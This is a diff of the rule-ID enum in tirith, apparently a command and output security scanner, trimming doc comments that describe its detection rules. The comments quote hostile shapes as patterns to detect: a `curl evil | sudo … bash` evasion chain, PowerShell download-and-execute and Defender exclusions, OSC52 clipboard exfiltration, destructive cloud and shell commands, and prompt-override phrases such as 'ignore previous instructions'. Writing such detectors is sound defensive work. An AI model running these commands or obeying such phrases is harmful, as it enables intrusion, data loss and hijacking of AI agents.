@@ -54,30 +54,21 @@ pub enum RuleId {
     CredentialFileSweep,
     Base64DecodeExecute,
     DataExfiltration,
-    /// M13 — a pipe SINK's interpreter could not be resolved because its wrapper
-    /// chain (`sudo` / `env -S` / `command` / `exec` / `nohup`) nests DEEPER than
-    /// the [`crate::rules`] `MAX_WRAPPER_DEPTH` (32) the interpreter resolver will
-    /// unwrap. Emitted by `check_pipe_to_interpreter` ONLY when resolution gives
-    /// up due to DEPTH-EXHAUSTION (a truncated chain) — not when a leader is
-    /// simply not an interpreter. Closes the silent evasion where
-    /// `curl evil | sudo …(×32)… env -S "bash"` (or a nested `env -S "env -S
-    /// \"…\""` payload) exhausts the budget so `CurlPipeShell`/`PipeToInterpreter`
-    /// never fires. Medium/Warn: an "obfuscated beyond tirith's analysis depth,
-    /// treat as suspicious" signal, not a confirmed exploit — failing toward a
-    /// VISIBLE finding is the honest behaviour for a security tool. Tier-1 rides
-    /// the existing `pipe_to_interpreter` PATTERN_TABLE entry (the literal sink
-    /// interpreter token plus the `| sudo`/`| env` fragment still trip it).
+    /// M13 — a pipe sink's interpreter could not be resolved because its wrapper
+    /// chain (`sudo`/`env -S`/`command`/`exec`/`nohup`) nests deeper than
+    /// `MAX_WRAPPER_DEPTH` (32). Emitted by `check_pipe_to_interpreter` only on
+    /// depth-exhaustion, closing the evasion where `curl evil | sudo …(×32)… env
+    /// -S "bash"` exhausts the budget. Medium/Warn — "obfuscated beyond analysis
+    /// depth", not a confirmed exploit. Tier-1 rides the existing
+    /// `pipe_to_interpreter` PATTERN_TABLE entry.
     WrapperChainTooDeep,
     /// M5 item 16 — PowerShell `Set-ExecutionPolicy Bypass` (cmdlet or
-    /// `powershell -ExecutionPolicy Bypass` flag form). Disables script
-    /// signing enforcement so subsequent downloaded scripts run unsigned.
+    /// `-ExecutionPolicy Bypass` flag). Disables script-signing enforcement.
     PsSetExecutionPolicyBypass,
-    /// M5 item 16 — PowerShell `Add-MpPreference -ExclusionPath`,
-    /// `-ExclusionProcess`, or `-ExclusionExtension`. Adds a Windows Defender
-    /// exclusion to hide malicious payloads from scanning.
+    /// M5 item 16 — PowerShell `Add-MpPreference -Exclusion*`. Adds a Windows
+    /// Defender exclusion to hide payloads from scanning.
     PsDefenderExclusion,
-    /// M5 item 16 — PowerShell `iex (iwr https://...)` inline form where
-    /// `iex` / `invoke-expression` is the leading command. The pipe form
+    /// M5 item 16 — PowerShell `iex (iwr https://...)` inline form. The pipe form
     /// (`iwr url | iex`) is handled by `pipe_to_interpreter`.
     PsInlineDownloadExecute,
 
@@ -161,73 +152,50 @@ pub enum RuleId {
     ThreatSafeBrowsing,
 
     // Package reputation rules (M6 ch6) — emitted by package_risk /
-    // install_txn / ecosystem_scan when the registry-API path returns one of
-    // the seven new signals. Tier-1 attach via the existing
-    // `install_command` / package extractor; no new PATTERN_TABLE entry.
-    /// M6 ch6 — the registry positively reports the package does not exist
-    /// (HTTP 404). Distinct from `ApiSignals::Unavailable` (timeout /
-    /// unsupported registry / offline), which carries no "exists" claim.
-    /// Medium baseline; elevated to Block via ch7 `block_not_found: true`.
+    // install_txn / ecosystem_scan from the registry-API path. Tier-1 attaches
+    // via the existing `install_command` / package extractor; no new entry.
+    /// M6 ch6 — the registry reports the package does not exist (HTTP 404).
+    /// Distinct from `ApiSignals::Unavailable` (no "exists" claim). Medium
+    /// baseline; elevated to Block via ch7 `block_not_found: true`.
     PackageNotFoundInRegistry,
-    /// M6 ch6 — `MaintainerChangeHistory` diff between the two most recent
-    /// local snapshots shows added or removed maintainers within the
+    /// M6 ch6 — snapshot diff shows added/removed maintainers within the
     /// recency window. Medium severity.
     PackageMaintainerChangeRecent,
-    /// M6 ch6 — registry snapshot diff confirms a *real* ownership transfer
-    /// (every previous maintainer is gone; non-empty new set). Distinct
-    /// from the inferred `ApiProvenance::ownership_transferred` flag (which
-    /// is `zero owners` only), now superseded by snapshot-vs-snapshot diff.
-    /// Medium severity.
+    /// M6 ch6 — snapshot diff confirms a real ownership transfer (all previous
+    /// maintainers gone, non-empty new set). Medium severity.
     PackageOwnershipTransferred,
-    /// M6 ch6 — OSV correlation through the shipping `threatdb_api.rs`
-    /// cache surfaced an active advisory for `(eco, name, version)`. High
-    /// severity when CVSS ≥ 7.
+    /// M6 ch6 — OSV correlation surfaced an active advisory for `(eco, name,
+    /// version)`. High when CVSS ≥ 7.
     PackageOsvAdvisoryActive,
-    /// M6 ch6 — dependency-confusion heuristic: the package name matches
-    /// an operator-supplied internal name AND tirith fetched it from the
-    /// public registry, OR an `@org` scope is reserved but the package
-    /// lives in the public registry. High severity.
+    /// M6 ch6 — dependency-confusion: the name matches an operator-supplied
+    /// internal name (or reserved `@org` scope) but was fetched from the public
+    /// registry. High severity.
     PackageDependencyConfusion,
-    /// M6 ch6 — install-script heuristic found a network call or shell
-    /// spawn inside an npm `preinstall`/`install`/`postinstall`/`prepare`
-    /// script, a `setup.py` body, or a `build.rs` body. Medium severity;
-    /// heuristic, document the false-positive risk.
+    /// M6 ch6 — install-script heuristic found a network call / shell spawn in an
+    /// npm lifecycle script, `setup.py`, or `build.rs`. Medium; heuristic.
     PackageInstallScriptNetworkCall,
-    /// M6 ch6 — registry-claimed repository URL fails verification under
-    /// `--online`: dead host, parses as a non-git URL, or hosted manifest
-    /// does not mention the package name. High severity.
+    /// M6 ch6 — registry-claimed repo URL fails verification under `--online`
+    /// (dead host, non-git URL, or manifest omits the package name). High.
     PackageRepoMismatch,
 
-    // Package-policy gated rules (M6 ch7) — these fire from
-    // `install_txn` / `ecosystem_scan` when the `package_policy` section
-    // (chunk 7) crosses a configured threshold. Each has a clean default
-    // behavior at the M6 ch6 baseline and only fires when policy carries
-    // a stronger threshold.
-    /// M6 ch7 — the package is newer than the policy's
-    /// `block_newer_than_days` / `warn_newer_than_days`. Warn baseline;
-    /// elevated to Block when the Block threshold is configured AND the
-    /// package's age is at or below it.
+    // Package-policy gated rules (M6 ch7) — fire from `install_txn` /
+    // `ecosystem_scan` when the `package_policy` section crosses a configured
+    // threshold; clean default at the M6 ch6 baseline.
+    /// M6 ch7 — package newer than `block_newer_than_days` /
+    /// `warn_newer_than_days`. Warn baseline; Block when the age is at or below
+    /// a configured Block threshold.
     PackagePolicyNewerThanDays,
-    /// M6 ch7 — the package's `recent_downloads` is at or below the
-    /// policy's `warn_low_downloads_below`. Warn severity. Requires
-    /// `--online` to gather the downloads count.
+    /// M6 ch7 — `recent_downloads` at or below `warn_low_downloads_below`. Warn.
+    /// Requires `--online`.
     PackagePolicyLowDownloads,
-    /// M6 ch7 — the package name is within the policy's
-    /// `block_typosquat_distance` edit distance of a known-popular name.
-    /// Block severity. Distinct from `ThreatPackageTyposquat` (DB-confirmed)
-    /// and `ThreatPackageSimilarName` (advisory) — this fires from a
-    /// policy-supplied distance threshold rather than the threat-DB.
+    /// M6 ch7 — name within `block_typosquat_distance` of a known-popular name.
+    /// Block. Policy-distance based (vs the DB-confirmed `ThreatPackageTyposquat`).
     PackagePolicyTyposquatDistance,
-    /// M6 ch7 — the package is `NameVsPopular::Unknown` AND the
-    /// install-script analysis flagged a network call or shell spawn.
-    /// Block severity. Requires the install-script signal — `--online`
-    /// install (npm inline), `ecosystem scan --installed`, or
-    /// `package scan --lockfile --online`.
+    /// M6 ch7 — `NameVsPopular::Unknown` AND the install-script analysis flagged
+    /// a network call / shell spawn. Block. Requires the install-script signal.
     PackagePolicyUnknownPackageWithInstallScripts,
-    /// M6 ch7 — the registry positively reports the package does not
-    /// exist (`PackageExistence::NotFound`) AND the policy carries
-    /// `block_not_found: true`. Block severity. Requires `--online`;
-    /// offline runs report `Unknown` and this rule never fires.
+    /// M6 ch7 — registry reports the package not found AND policy sets
+    /// `block_not_found: true`. Block. Requires `--online` (offline → Unknown).
     PackagePolicyNotFound,
 
     // Rendered content rules
@@ -253,10 +221,9 @@ pub enum RuleId {
 
     // Policy rules
     PolicyBlocklisted,
-    /// M4 item 8 chunk 3 — the verdict's caller `AgentOrigin` matched a
-    /// `deny` matcher in `agent_rules`. Forces the verdict's [`Action`] to
-    /// [`Action::Block`] regardless of any detection finding. See
-    /// `policy::agent_decision` and `docs/agent-governance-design.md` §5.
+    /// M4 item 8 ch3 — the caller `AgentOrigin` matched a `deny` matcher in
+    /// `agent_rules`; forces the verdict to [`Action::Block`] regardless of any
+    /// finding. See `policy::agent_decision` and `docs/agent-governance-design.md` §5.
     AgentDeniedByPolicy,
 
     // Custom rules
@@ -265,731 +232,463 @@ pub enum RuleId {
     // License/infrastructure rules
     LicenseRequired,
 
-    // Output-direction rules (M7 ch1) — fire from `engine::analyze_output`
-    // when scanning the stdout/stderr of a command (e.g. `tirith view <file>`,
-    // future M7 ch4 MCP gateway, M7 ch5 log viewer). They never fire from the
-    // exec / paste hot path. Detection is byte-scan based (OSC52, OSC8, title
-    // set, screen-clear sequences) and bypasses `PATTERN_TABLE` — the
-    // `analyze_output` pipeline does not go through the tier-1 exec/paste
-    // regex gate.
-    /// M7 ch1 — `\e]52;c;<base64>\a` writes to the system clipboard from a
-    /// stream the user is only watching. High severity — silent exfil of
-    /// secrets the user just typed becomes a one-key paste away.
+    // Output-direction rules (M7 ch1) — fire from `engine::analyze_output` when
+    // scanning a command's stdout/stderr, never the exec/paste hot path.
+    // Byte-scan based (OSC52, OSC8, title, screen-clear); bypass `PATTERN_TABLE`.
+    /// M7 ch1 — `\e]52;c;<base64>\a` writes to the system clipboard from a stream
+    /// the user is only watching. High — silent exfil one keypress from a paste.
     OutputOsc52ClipboardWrite,
-    /// M7 ch1 — text rendered invisibly. v1 scope is narrow: (i) explicit
-    /// ANSI foreground == explicit ANSI background within a single SGR
-    /// sequence, OR (ii) a zero-width-character run > 8 chars. Terminal-
-    /// theme-dependent detection (text inherits a default color) is out of
-    /// v1 — documented as a follow-up in `rules/output.rs`.
+    /// M7 ch1 — text rendered invisibly. Narrow v1: (i) explicit ANSI fg == bg in
+    /// one SGR, or (ii) a zero-width run > 8 chars. Theme-dependent detection is a
+    /// documented follow-up.
     OutputHiddenText,
-    /// M7 ch1 — a `[PS1-shaped text]` injected mid-stream looks like a
-    /// fresh prompt and tricks the user into typing the next command at
-    /// what is actually the wrapped command's output. Medium severity.
+    /// M7 ch1 — a `[PS1-shaped text]` injected mid-stream looks like a fresh
+    /// prompt, tricking the user into typing the next command into output. Medium.
     OutputFakePrompt,
-    /// M7 ch1 — OSC 8 hyperlink where the visible text itself parses as a
-    /// URL with a host that differs from the link's `href` host. High
-    /// severity. "Click here" vs `https://example.com` does NOT fire —
-    /// only when the visible text is a URL whose host doesn't match.
+    /// M7 ch1 — OSC 8 hyperlink whose visible text is a URL with a host differing
+    /// from the `href` host. High. "Click here" vs a URL does NOT fire.
     OutputTerminalHyperlinkMismatch,
-    /// M7 ch1 — terminal window title rewrite (`\e]0;…\a` / `\e]2;…\a`)
-    /// from an untrusted output stream. Info severity. Used by attackers
-    /// to mask a backgrounded shell as "$EDITOR foo.txt".
+    /// M7 ch1 — terminal window-title rewrite (`\e]0;…\a` / `\e]2;…\a`) from an
+    /// untrusted stream. Info. Masks a backgrounded shell as `$EDITOR foo.txt`.
     OutputTitleManipulation,
-    /// M7 ch1 — explicit screen-clear sequences (`\e[2J` / `\e[H`) mid-
-    /// stream. Info severity — used to scroll the prior output (your
-    /// command, the program's output) off-screen so a fake banner can
-    /// take its place.
+    /// M7 ch1 — screen-clear sequences (`\e[2J` / `\e[H`) mid-stream. Info —
+    /// scrolls prior output off-screen so a fake banner can take its place.
     OutputClearScreen,
-    /// M7 ch1 — an escape sequence (OSC / CSI) was open at end-of-stream
-    /// without a terminator. Truncated `\e]52;<base64>` (no BEL/ST) used to
-    /// be silently dropped — the OSC52 attack started but produced zero
-    /// findings. We emit this with Medium severity so callers fail-closed
-    /// can DENY the response. Silent-failure fix (Sev-5).
+    /// M7 ch1 — an OSC/CSI escape open at end-of-stream without a terminator.
+    /// Truncated `\e]52;<base64>` was silently dropped; emit Medium so a
+    /// fail-closed caller can DENY (Sev-5).
     OutputTruncatedEscapeSequence,
 
-    // Prompt-injection rules (M7 ch5) — fire from `rules::prompt_injection`
-    // when a well-known instruction-override / role-override seed phrase
-    // appears in the scanned text. Reached from:
-    //   * `engine::analyze_output` (the M7 ch1 output pipeline), and
-    //   * `engine::analyze` for `ScanContext::Paste` and `ScanContext::FileScan`,
-    //     gated by the `prompt_injection_seed` PATTERN_TABLE entry in build.rs.
-    // Honest scope: these catch well-known patterns and are NOT a complete
-    // defense — treat agent output as untrusted regardless. See the module
-    // doc at `rules/prompt_injection.rs` for the full disclaimer.
-    /// M7 ch5 — a prompt-injection seed phrase (e.g. "act as <role>",
-    /// "you are now", "system:", "DAN mode", "do anything now") appeared
-    /// in the scanned text. High severity.
+    // Prompt-injection rules (M7 ch5) — fire from `rules::prompt_injection` when
+    // a seed phrase appears, reached from `analyze_output` and from `analyze`
+    // (Paste/FileScan, gated by the `prompt_injection_seed` PATTERN_TABLE entry).
+    // Catch well-known patterns only — NOT a complete defense; see the module doc.
+    /// M7 ch5 — a prompt-injection seed phrase ("act as <role>", "you are now",
+    /// "system:", "DAN mode", …) appeared. High severity.
     PromptInjectionInOutput,
-    /// M7 ch5 — the highest-confidence subset: an explicit instruction-
-    /// override seed phrase ("ignore previous instructions", "disregard
-    /// above", "forget the above", "override your instructions", "new
-    /// instructions:", "ignore your training"). High severity.
+    /// M7 ch5 — the highest-confidence subset: an explicit instruction-override
+    /// phrase ("ignore previous instructions", "override your instructions", …).
+    /// High severity.
     IgnorePreviousInstructions,
 
-    // Operational-context rules (M8 ch1) — fire from `rules::context` when
-    // the parsed command's leader is a cloud / k8s CLI
-    // (`kubectl`, `kustomize`, `helm`, `argocd`, `aws`, `aws-vault`,
-    // `gcloud`, `az`) and the operation is destructive while the active
-    // provider context is labeled production / critical. Context detection
-    // lives in `crate::context_detect`; labels live in
-    // `~/.config/tirith/context-labels.yaml` (user) or
-    // `<repo>/.tirith/context-labels.yaml` (repo).
-    /// M8 ch1 — destructive cloud / k8s command against a production-
-    /// labeled context. High severity. Examples:
-    /// `kubectl delete namespace payments`, `helm uninstall payments`,
-    /// `aws s3 rm s3://prod-bucket --recursive`,
-    /// `gcloud compute instances delete prod-frontend`.
+    // Operational-context rules (M8 ch1) — fire from `rules::context` when the
+    // leader is a cloud/k8s CLI (kubectl, helm, aws, gcloud, az, …) and the active
+    // provider context is labeled production/critical. Detection in
+    // `crate::context_detect`; labels in `context-labels.yaml` (user or repo).
+    /// M8 ch1 — destructive cloud/k8s command against a production-labeled
+    /// context. High. E.g. `kubectl delete namespace`, `aws s3 rm --recursive`.
     ContextProdDestructiveCommand,
-    /// M8 ch1 — write-shaped (but not strictly destructive) cloud / k8s
-    /// command against a production-labeled context. Medium severity.
-    /// Covers state mutations that aren't full deletes — e.g.
-    /// `kubectl apply`, `kubectl patch`, `helm upgrade`, `helm install`,
-    /// `aws s3 cp ... s3://prod/...`, `gcloud compute instances start`.
+    /// M8 ch1 — write-shaped (not strictly destructive) cloud/k8s command against
+    /// a production-labeled context. Medium. E.g. `kubectl apply`, `helm upgrade`.
     ContextProdWriteOperation,
-    /// M8 ch1 — credential / IAM change against a production-labeled
-    /// context. High severity. Covers IAM and access-key mutations that
-    /// are routinely irreversible (or audit-noisy if undone):
-    /// `aws iam create-access-key`, `aws iam delete-user`,
-    /// `gcloud iam service-accounts keys create`, `az ad sp delete`,
-    /// `kubectl create clusterrolebinding`, etc.
+    /// M8 ch1 — credential/IAM change against a production-labeled context. High.
+    /// E.g. `aws iam create-access-key`, `kubectl create clusterrolebinding`.
     ContextProdCredentialChange,
 
-    // SSH operational-context rules (M8 ch2) — fire from
-    // `rules::ssh_context` when the parsed command's leader is `ssh` and
-    // the resolved target host is in `policy.ssh_host_labels` with a
-    // critical / production criticality.
-    /// M8 ch2 — destructive remote command against an SSH host labeled
-    /// production / critical. High severity. The inner command (after the
-    /// host) is re-classified through the same destructive-verb heuristic
-    /// `rules::context` uses for cloud CLIs, with extra coverage for
-    /// general-purpose shell verbs (`systemctl stop`, `rm -rf`, `dd`,
-    /// `useradd`, etc.).
+    // SSH operational-context rules (M8 ch2) — fire from `rules::ssh_context`
+    // when the leader is `ssh` and the target host is labeled critical/production
+    // in `policy.ssh_host_labels`.
+    /// M8 ch2 — destructive remote command against a labeled SSH host. High. The
+    /// inner command is re-classified through the `rules::context` destructive-verb
+    /// heuristic plus general shell verbs (`systemctl stop`, `rm -rf`, `dd`, …).
     SshRemoteDestructiveOnLabeledHost,
-    /// M8 ch2 — opening a bare interactive remote shell against a labeled
-    /// host. Info severity (does not block). Surfaces that tirith protects
-    /// the LOCAL shell only — commands typed after the SSH handshake are
-    /// not intercepted unless the operator runs `tirith ssh bootstrap`
-    /// (planned for M8.1) to install the hook on the remote side.
+    /// M8 ch2 — opening a bare interactive remote shell against a labeled host.
+    /// Info (does not block). tirith protects the LOCAL shell only; commands after
+    /// the handshake are not intercepted without `tirith ssh bootstrap` (M8.1).
     SshRemoteShellOnLabeledHost,
 
-    // IaC operational-context rules (M8 ch3) — fire from `rules::iac` when
-    // the parsed command's leader is an IaC CLI (`terraform`, `pulumi`,
-    // `tofu`). Detection short-circuits when the leader is not an IaC CLI.
-    // `apply <tfplan>` paths can additionally consult the plan-hash store
-    // under `state_dir()/iac_plans/<sha256>` to detect plan tampering when
+    // IaC operational-context rules (M8 ch3) — fire from `rules::iac` when the
+    // leader is an IaC CLI (`terraform`/`pulumi`/`tofu`). `apply <tfplan>` paths
+    // also consult the plan-hash store (`state_dir()/iac_plans/<sha256>`) when
     // `policy.iac_require_plan_before_apply` is on.
-    /// M8 ch3 — `terraform apply` (or `pulumi up`, `tofu apply`) issued
-    /// without a saved plan, where the policy requires one
-    /// (`policy.iac_require_plan_before_apply: true`). High severity.
-    /// The "apply with no plan" shape combined with the policy switch
-    /// is treated as a deliberate gate violation.
+    /// M8 ch3 — `terraform apply` with no saved plan where policy requires one
+    /// (`iac_require_plan_before_apply: true`). High — a deliberate gate violation.
     IacApplyWithoutPlan,
-    /// M8 ch3 — `terraform apply -auto-approve` (or `pulumi up --yes`,
-    /// `tofu apply -auto-approve`) outside of a production-labeled
-    /// context. Medium severity — auto-approve is a footgun even in dev,
-    /// but does not warrant a Block default.
+    /// M8 ch3 — `apply -auto-approve` (or `pulumi up --yes`) outside a
+    /// production-labeled context. Medium — a footgun, but not a Block default.
     IacApplyAutoApprove,
-    /// M8 ch3 — `terraform apply -auto-approve` (or equivalents) inside
-    /// a production-labeled context (resolved through the M8 ch1 active
-    /// context + labels file). High severity — auto-approve in prod is
+    /// M8 ch3 — `apply -auto-approve` inside a production-labeled context. High —
     /// the documented anti-pattern.
     IacApplyAutoApproveProd,
-    /// M8 ch3 — `terraform destroy` / `pulumi destroy` / `tofu destroy`
-    /// inside a production-labeled context. High severity — destroys
-    /// resources that take hours to days to recreate.
+    /// M8 ch3 — `destroy` inside a production-labeled context. High — destroys
+    /// resources that take hours to recreate.
     IacDestroyProd,
-    /// M8 ch3 — `tirith iac check-plan` parsed a saved plan and found
-    /// high-risk changes (IAM mutations, security-group changes,
-    /// public-bucket grants, DB deletes, load-balancer changes).
-    /// Medium severity — heuristic, but worth surfacing.
+    /// M8 ch3 — `tirith iac check-plan` found high-risk changes (IAM, security
+    /// groups, public-bucket grants, DB deletes, LB changes). Medium; heuristic.
     IacPlanHighRiskChanges,
-    /// M8 ch3 — `terraform apply <tfplan>` where the supplied plan file
-    /// does not match any hash in the `iac_plans` store. Either the plan
-    /// was tampered with after `iac check-plan` recorded it, or the plan
-    /// was never checked. High severity when
-    /// `policy.iac_require_plan_before_apply: true` is set.
+    /// M8 ch3 — `terraform apply <tfplan>` where the plan file matches no hash in
+    /// the `iac_plans` store (tampered or never checked). High when
+    /// `iac_require_plan_before_apply: true`.
     IacPlanHashMismatch,
 
-    // Sudo-escalation rules (M8 ch4) — fire from `rules::sudo` when the
-    // parsed command's leader resolves to `sudo` (direct or behind an
-    // `env`-style wrapper). The PATTERN_TABLE entry `sudo_cmd` is the
-    // tier-1 gate. All five default to High severity; the M8 ch4
-    // `policy.sudo_require_reason` + sudo-session file together can
-    // downgrade them to Medium when the operator has tagged an active
-    // session.
-    /// M8 ch4 — `sudo sh|bash|zsh|fish|dash|ksh|tcsh|pwsh|powershell|nu`
-    /// opens an interactive root shell. Subsequent commands typed into
-    /// the spawned shell run as root with zero tirith visibility — we
-    /// intercept the local shell only, not nested shells. High severity.
+    // Sudo-escalation rules (M8 ch4) — fire from `rules::sudo` when the leader
+    // resolves to `sudo` (direct or behind an `env`-style wrapper). Tier-1 gate is
+    // the `sudo_cmd` PATTERN_TABLE entry. All five default High; an active tagged
+    // sudo-session under `policy.sudo_require_reason` can downgrade to Medium.
+    /// M8 ch4 — `sudo sh|bash|…` opens an interactive root shell whose subsequent
+    /// commands run as root with zero tirith visibility. High.
     SudoShellSpawn,
-    /// M8 ch4 — `sudo -E` / `--preserve-env` with at least one sensitive
-    /// env var from `assets/data/sensitive_env.toml` currently set in
-    /// the parent shell's environment (OR `--preserve-env=VAR_LIST`
-    /// where the list intersects the sensitive set). The credentials
-    /// become readable via `/proc/<pid>/environ` to anything that can
-    /// enumerate processes. High severity.
+    /// M8 ch4 — `sudo -E` / `--preserve-env[=LIST]` with a sensitive env var
+    /// (`sensitive_env.toml`) set, making credentials readable via
+    /// `/proc/<pid>/environ`. High.
     SudoEnvPreserveSensitive,
-    /// M8 ch4 — `… | sudo tee <system-path>` writing attacker-
-    /// controllable input to a privileged system file (`/etc/…`,
-    /// `/usr/local/bin/…`, `/lib/systemd/…`, `/etc/cron*`). The
-    /// `/tmp`, `~`, and repo-relative shapes never fire. High severity.
+    /// M8 ch4 — `… | sudo tee <system-path>` writing to a privileged file
+    /// (`/etc/…`, `/usr/local/bin/…`, `/etc/cron*`). `/tmp`/`~`/repo shapes never
+    /// fire. High.
     SudoTeeSystemFile,
-    /// M8 ch4 — `sudo curl|wget|fetch -o <system-path>` (or
-    /// `--output=…` / `-O …` equivalents) downloading remote content
-    /// directly to a privileged system path as root. Bypasses package
-    /// signing entirely. High severity.
+    /// M8 ch4 — `sudo curl|wget|fetch -o <system-path>` downloading to a
+    /// privileged path as root, bypassing package signing. High.
     SudoDownloadInstall,
     /// M8 ch4 — `sudo chmod|chown -R …` against a broad system tree
-    /// (`/`, `/home`, `/usr`, `/etc`). Routinely strips setuid bits,
-    /// locks operators out of their homedirs, or breaks distro
-    /// packages. High severity.
+    /// (`/`, `/home`, `/usr`, `/etc`). Strips setuid bits / breaks packages. High.
     SudoRecursivePermsBroadPath,
 
-    // Container-runtime rules (M8 ch5) — fire from `rules::container`
-    // when the parsed command's leader is `docker` / `podman` and the
-    // subcommand is `run` / `create` / `exec`. PATTERN_TABLE entries
-    // `docker_run` and `docker_exec` are the tier-1 gates. The
-    // `--privileged` and sensitive-bind-mount rules fire from `run` /
-    // `create`; the prod-container rule fires from `exec` against
-    // a container whose `container:<name>` label is in
-    // `policy.context_labels`.
-    /// M8 ch5 — `docker run --privileged …` disables every Linux
-    /// kernel security boundary the runtime normally enforces (caps,
-    /// seccomp, AppArmor, device cgroup). A breakout from the
-    /// container becomes a breakout to the host. High severity.
+    // Container-runtime rules (M8 ch5) — fire from `rules::container` when the
+    // leader is `docker`/`podman` and the subcommand is `run`/`create`/`exec`.
+    // Tier-1 gates are the `docker_run` / `docker_exec` PATTERN_TABLE entries.
+    /// M8 ch5 — `docker run --privileged …` disables every kernel security
+    /// boundary (caps, seccomp, AppArmor, device cgroup); a container breakout
+    /// becomes a host breakout. High.
     DockerRunPrivileged,
-    /// M8 ch5 — `docker run -v <sensitive>:…` where `<sensitive>` is
-    /// one of `/var/run/docker.sock`, `~/.ssh`, `~/.aws`, `/etc`, or
-    /// the equivalent `--mount type=bind,source=…` shape. The
-    /// docker-socket variant is equivalent to host root once mounted;
-    /// the other paths leak credentials / system config into the
-    /// container. High severity.
+    /// M8 ch5 — `docker run -v <sensitive>:…` (or `--mount`) where `<sensitive>`
+    /// is `/var/run/docker.sock`, `~/.ssh`, `~/.aws`, `/etc`. The socket is host
+    /// root once mounted. High.
     DockerRunSensitiveBindMount,
-    /// M8 ch5 — `docker exec <container> …` against a container
-    /// whose `container:<name>` entry in `policy.context_labels`
-    /// resolves to `prod` / `production` / `critical` / `live` / `p0`
-    /// / `p1`. Medium severity — surface the signal, do not block,
-    /// because reading logs is often legitimate even on a prod
-    /// container.
+    /// M8 ch5 — `docker exec <container> …` against a container labeled
+    /// prod/critical/… in `policy.context_labels`. Medium — surface, don't block
+    /// (reading logs is often legitimate).
     DockerExecProdContainer,
 
     // Workstation file-permission / credential-file hygiene rules (M9 ch1).
-    // These fire ONLY from the `tirith hygiene scan|fix` filesystem walk
-    // (`crate::hygiene`), never from the `engine::analyze` exec/paste hot
-    // path or `analyze_output`. They are perm-/contents-/location-based
-    // checks against well-known sensitive paths under `~` and the repo root,
-    // so they carry no PATTERN_TABLE entry and live in
+    // Fire ONLY from the `tirith hygiene scan|fix` filesystem walk
+    // (`crate::hygiene`), never the hot path; no PATTERN_TABLE entry, live in
     // `EXTERNALLY_TRIGGERED_RULES`. Covered by unit tests in `hygiene.rs`.
-    /// M9 ch1 — a `~/.ssh/id_*` private key is group- or other-accessible
-    /// (`mode & 0o077 != 0`). High severity. Auto-fixable via `chmod 0600`.
+    /// M9 ch1 — `~/.ssh/id_*` private key group/other-accessible
+    /// (`mode & 0o077 != 0`). High. Auto-fix `chmod 0600`.
     HygienePrivateKeyLoosePerms,
-    /// M9 ch1 — a repo `.env` / `.env.*` file is world-readable
-    /// (`mode & 0o004 != 0`). High severity — env files routinely hold
-    /// API keys and DB passwords. Auto-fixable via `chmod 0600`.
+    /// M9 ch1 — repo `.env`/`.env.*` world-readable (`mode & 0o004 != 0`). High.
+    /// Auto-fix `chmod 0600`.
     HygieneEnvWorldReadable,
-    /// M9 ch1 — `~/.kube/config` is group- or other-accessible. Medium
-    /// severity (common distro default is 0644; the threat is local-
-    /// multiuser). Auto-fixable via `chmod 0600`.
+    /// M9 ch1 — `~/.kube/config` group/other-accessible. Medium (threat is
+    /// local-multiuser). Auto-fix `chmod 0600`.
     HygieneKubeconfigGroupReadable,
-    /// M9 ch1 — `~/.npmrc` carries a literal `_authToken` / `_password`
-    /// (not an `${ENV}` reference). High severity — a publish/install
-    /// credential on disk. Manual fix (rotate + env-indirect).
+    /// M9 ch1 — `~/.npmrc` carries a literal `_authToken`/`_password` (not
+    /// `${ENV}`). High. Manual fix (rotate + env-indirect).
     HygieneNpmrcPlaintextToken,
-    /// M9 ch1 — `~/.pypirc` carries a literal `password` / `pypi-…` token.
-    /// High severity. Manual fix (keyring / env reference + rotate).
+    /// M9 ch1 — `~/.pypirc` carries a literal `password`/`pypi-…` token. High.
+    /// Manual fix (keyring / env + rotate).
     HygienePypircPlaintextToken,
-    /// M9 ch1 — `~/.ssh/config` contains an `Include` directive that
-    /// resolves outside `~/.ssh` (absolute path elsewhere, `~/…` outside
-    /// `.ssh`, or a `../` escape). Medium severity. Manual fix (review).
+    /// M9 ch1 — `~/.ssh/config` `Include` resolving outside `~/.ssh` (abs path,
+    /// `~/…` elsewhere, or `../` escape). Medium. Manual fix (review).
     HygieneSshConfigUnsafeInclude,
-    /// M9 ch1 — `~/.gitconfig` sets `credential.helper = store`, which
-    /// persists every git credential as cleartext in `~/.git-credentials`.
-    /// Medium severity. Manual fix (switch to an OS keychain helper).
+    /// M9 ch1 — `~/.gitconfig` sets `credential.helper = store` (persists git
+    /// creds as cleartext). Medium. Manual fix (OS keychain helper).
     HygieneGitCredentialHelperStore,
-    /// M9 ch1 — a shell history (`~/.bash_history`, `~/.zsh_history`, …)
-    /// contains credential-shaped text, detected with the SHIPPING
-    /// high-confidence credential detector (`rules::credential`), not a new
-    /// regex. Medium severity. Manual fix (scrub + rotate).
+    /// M9 ch1 — a shell history contains credential-shaped text (detected via the
+    /// shipping `rules::credential` detector). Medium. Manual fix (scrub + rotate).
     HygieneShellHistorySecretLike,
-    /// M9 ch1 — `~/.aws/credentials` (or `~/.aws/config`) is group- or
-    /// other-accessible. High severity — long-lived cloud access keys.
-    /// Auto-fixable via `chmod 0600`.
+    /// M9 ch1 — `~/.aws/credentials` (or `config`) group/other-accessible. High —
+    /// long-lived cloud keys. Auto-fix `chmod 0600`.
     HygieneCloudCredsBadPerms,
-    /// M9 ch1 — a `*.dump` / `*.sql` database dump is present in the repo
-    /// tree (outside `.git` / `node_modules` / `target` / `vendor`).
-    /// Medium severity — dumps frequently carry PII / credentials. Manual
-    /// fix (move out of repo + .gitignore; tirith never deletes files).
+    /// M9 ch1 — a `*.dump`/`*.sql` dump in the repo tree (outside
+    /// `.git`/`node_modules`/`target`/`vendor`). Medium. Manual fix (move out +
+    /// .gitignore; tirith never deletes files).
     HygieneDbDumpInRepo,
 
-    // Persistence-mechanism state-change rules (M9 ch2). These fire ONLY
-    // from the `tirith persistence diff|watch` snapshot comparison
-    // (`crate::persistence`), never from the `engine::analyze` exec/paste
-    // hot path or `analyze_output`. They detect a *change* (new/modified
-    // content) in a well-known persistence surface relative to a recorded
-    // snapshot, so they carry no PATTERN_TABLE entry and live in
-    // `EXTERNALLY_TRIGGERED_RULES`. Covered by unit tests in
-    // `persistence.rs` against a `tempfile::tempdir()` root.
-    /// M9 ch2 — a shell rc/profile (`~/.bashrc`, `~/.zshrc`, `~/.profile`,
-    /// fish/PowerShell profile) changed (sha256 differs) since the recorded
-    /// snapshot. Medium severity — rc files are a classic persistence
-    /// foothold (aliases, exported PATH shims, sourced payloads).
+    // Persistence-mechanism state-change rules (M9 ch2). Fire ONLY from the
